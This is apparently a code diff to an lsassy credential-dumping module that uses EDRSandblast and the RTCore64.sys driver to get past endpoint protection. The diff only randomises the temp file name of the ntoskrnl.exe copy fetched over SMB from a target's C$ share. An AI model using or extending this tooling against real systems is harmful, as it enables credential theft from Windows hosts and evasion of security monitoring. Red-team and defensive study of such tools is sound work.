@@ -4,6 +4,8 @@ https://github.com/wavestone-cdt/EDRSandblast
 
 import logging
 import os
+import random
+import string
 import subprocess
 
 from lsassy.dumpmethod import IDumpMethod, Dependency
@@ -16,20 +18,22 @@ class DumpMethod(IDumpMethod):
         self.RTCore64 = Dependency("RTCore64", "RTCore64.sys")
         self.ntoskrnl = Dependency("ntoskrnl", "NtoskrnlOffsets.csv")
 
+        self.tmp_ntoskrnl = "lsassy_" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) + ".exe"
+
     def prepare(self, options):
-        with open('/tmp/n.exe', 'wb') as p:
+        with open('/tmp/{}'.format(self.tmp_ntoskrnl), 'wb') as p:
             try:
                 self._session.smb_session.getFile("C$", "\\Windows\\System32\\ntoskrnl.exe", p.write)
-                logging.success("ntoskrnl.exe downloaded to /tmp/n.exe")
+                logging.success("ntoskrnl.exe downloaded to /tmp/{}".format(self.tmp_ntoskrnl))
             except Exception as e:
                 logging.error("ntoskrnl.exe download error", exc_info=True)
                 return None
-        self.ntoskrnl.content = self.get_offsets("/tmp/n.exe")
+        self.ntoskrnl.content = self.get_offsets("/tmp/{}".format(self.tmp_ntoskrnl))
 
         if self.ntoskrnl.content is not None:
             logging.success("ntoskrnl offsets extracted")
             logging.debug(self.ntoskrnl.content.split("\n")[1])
-        os.remove('/tmp/n.exe')
+        os.remove('/tmp/{}'.format(self.tmp_ntoskrnl))
 
         return self.prepare_dependencies(options, [self.edrsandblast, self.RTCore64, self.ntoskrnl])
 
